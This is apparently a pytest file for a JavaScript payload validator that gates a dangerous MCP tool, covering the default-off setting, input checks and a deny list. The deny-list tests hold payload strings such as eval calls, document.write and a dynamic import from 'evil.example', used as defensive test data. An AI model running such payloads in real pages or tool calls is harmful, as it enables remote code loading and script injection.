"""Security tests for JS payload validation and dangerous-tool gating."""

import pytest

from src.exceptions import ValidationError
from src.mcp.utils import validate_js_payload


class TestValidateJSPayload:
    def test_disabled_by_default(self):
        with pytest.raises(ValidationError, match="JS execution is disabled"):
            validate_js_payload("return 1", allow_dangerous=False)

    def test_empty_string_rejected(self):
        with pytest.raises(ValidationError, match="non-empty string"):
            validate_js_payload("", allow_dangerous=True)

    def test_whitespace_only_rejected(self):
        with pytest.raises(ValidationError, match="non-empty string"):
            validate_js_payload("   \n\t", allow_dangerous=True)

    def test_non_string_rejected(self):
        with pytest.raises(ValidationError):
            validate_js_payload(123, allow_dangerous=True)  # type: ignore[arg-type]

    def test_oversize_rejected(self):
        with pytest.raises(ValidationError, match="exceeds limit"):
            validate_js_payload("x" * 10, max_length=5, allow_dangerous=True)

    @pytest.mark.parametrize(
        "payload",
        [
            "eval('1+1')",
            "new Function('return 1')()",
            "document.write('xss')",
            "import('http://evil.example/m.js')",
            "WebAssembly.compile(buf)",
            "WebAssembly.instantiate(buf)",
            "importScripts('http://x')",
        ],
    )
    def test_denylist_blocks_known_constructs(self, payload):
        with pytest.raises(ValidationError, match="disallowed construct"):
            validate_js_payload(payload, allow_dangerous=True)

    def test_allows_innocuous_payload_when_opted_in(self):
        validate_js_payload("return document.title", allow_dangerous=True)

    def test_static_import_not_falsely_flagged(self):
        # Static import is a syntax form distinct from dynamic import().
        # Our denylist targets dynamic `import(...)` only.
        validate_js_payload("var x = importantThing", allow_dangerous=True)

    def test_field_name_in_error(self):
        with pytest.raises(ValidationError, match="'snippet'"):
            validate_js_payload("", field="snippet", allow_dangerous=True)
